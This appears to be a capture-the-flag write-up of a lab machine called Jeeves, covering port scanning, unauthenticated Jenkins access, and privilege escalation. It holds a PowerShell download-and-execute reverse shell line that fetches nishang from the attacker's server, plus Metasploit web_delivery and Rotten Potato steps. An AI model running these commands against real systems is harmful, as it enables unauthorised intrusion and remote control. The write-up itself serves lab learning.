## Nmap

I Started off scanning all ports and then a done a more intense scan on the ports found as per below:

```
nmap 10.10.10.63 -p-

I first tried `enum4linux` on SMB and did not get any valid hits for null session. I next moved onto port 80 whilst kicking off `gobuster` and `nikto `on port 80 and port 50000 since it has been reported as HTTP

![Kicking off multiple scans on port 80 and 50000](<../../../.gitbook/assets/image (175).png>)

## Port 80

Port 80 directs us over to a AskJeeves web page.

![Port 80](<../../../.gitbook/assets/image (176).png>)

Entering a value into the field and searching produces a error page which on further inspection appears to be an image. Searching using potential SQL injections or any other search parameter produces the same result.

![](<../../../.gitbook/assets/image (177).png>)

When viewing page source we get the following:

![](<../../../.gitbook/assets/image (178).png>)

Selecting "jeeves.PNG" takes us to the above image. Based on this I will not be spending anymore time on port 80 as we have still not inspected port 50000.

## Port 50000

Heading over to Port 50000 we land on the following page:

![Port 50000](<../../../.gitbook/assets/image (179).png>)

Clicking on the link takes us away to https://eclipse.org/jetty/

`gobuster` reveals a directory of /askjeeves/ on this port.&#x20;

![/askjeeves/](<../../../.gitbook/assets/image (181).png>)

Looks like we have unauthenticated access to Jenkins. As we have freedom of Jenkins we can select the "create new jobs" link. From here give the project a name and select "freestyle project".

![](<../../../.gitbook/assets/image (182).png>)

On the next screen head down to "Build" and then select "Execute Windows batch command".

![](<../../../.gitbook/assets/image (183).png>)

On this next part we are going to use nishang Invoke-PowershellTcp to get a reverse shell on the machine.

run the following with root permissions to install `nishang`

```
sudo apt-get install nishang
```

After install we can find the nishang files at `/usr/share/nishang/shells `Start a python server in the shells directory as we will need to pull one of the files to gain shell.&#x20;

![](<../../../.gitbook/assets/image (184).png>)

Set up a `netcat` listener. In this example I will be using port 443.

```
sudo nc -lvp 80
```

We can now insert the following command into the Jenkins batch command box. Changing IP and port where appropriate.

```
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

![](<../../../.gitbook/assets/image (185).png>)

After you have completed this save the project at the bottom of the screen and then on the following screen select "Build now"

![](<../../../.gitbook/assets/image (186).png>)

You should notice the python server receives a GET request for the file specified with a HTTP code 200. If you have incorrectly spelt the file you will receive a code 404.

![](<../../../.gitbook/assets/image (187).png>)

`netcat` should now pick up the shell and get you on the system as a low privilege account.

![low privilege shell.](<../../../.gitbook/assets/image (188).png>)

From here we can grab the user.txt flag before moving onto privilege escalation.

![](<../../../.gitbook/assets/image (189).png>)

## Privilege Escalation

For privilege escalation we should start with the normal system enumeration. We can run system info and run this against `Windows_exploit_suggester.py`.

I have covered Windows\_exploit\_suggester usage here if you need to know how to use it:

{% embed url="https://app.gitbook.com/@akimboviper/s/everything-windows/v/master/tools/enumeration/windows-exploit-suggester" %}

After going through the results of the python script what sticks out to us is the following exploit:

![](<../../../.gitbook/assets/image (190).png>)

FoxGlove Security have done a fantastic write up on the exploit which can be read here.

{% embed url="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/" %}

We can run the command `whoami /priv` and see if we have any of the correct privileges to perform the exploit. the privilege `SeImpersonatePrivilege` will allow us to run the exploit for MS16-075. This privilege is usually given to service accounts.

![](<../../../.gitbook/assets/image (191).png>)

We will be using `metasploi`t for the escalation and as such we will need to upgrade our shell to a meterpreter shell. Open `msfconsole` and search for `multi/script/web_delivery  `set the correct options.&#x20;

![](<../../../.gitbook/assets/image (192).png>)

Run the module and it should create some Powershell code which needs to be run on the victim machine. The web\_delivery module will keep a listener open waiting for when the code is run. When we execute the code on the victim machine this should give us a meterpreter shell back (depend on the payload you selected).

![Generating the payload.](<../../../.gitbook/assets/image (193).png>)

![Running the payload on the victim machine](<../../../.gitbook/assets/image (194).png>)

After running we should receive a shell back in `msfconsole`.&#x20;

![meterpreter shell](<../../../.gitbook/assets/image (195).png>)

We can now run a search for the exploit in `msfconsole` after back grounding our meterpreter session.

![](<../../../.gitbook/assets/image (196).png>)

Select options 1 for the juicy exploit and set the payload options. When you have filled out the correct information run the exploit and you should land a shell as system.

![NT Authority\System](<../../../.gitbook/assets/image (197).png>)

From here we should be able to grab root.txt?

![](<../../../.gitbook/assets/image (198).png>)

Or not... Looks like we will have to look elsewhere.

After some time and looking literally everywhere I could not find the root flag. I eventually turned to the HTB forums for hints and eventually came to the right answer with the command `Dir /R` this command allows you to view alternative datastream (ADS) files.&#x20;

![root flag](<../../../.gitbook/assets/image (199).png>)

After retrieving root I did a little research on finding ADS files as I do not believe I would have found this without a hint. Malwarebytes have done a great blog post on the subject and have provided some good methods for over coming this.
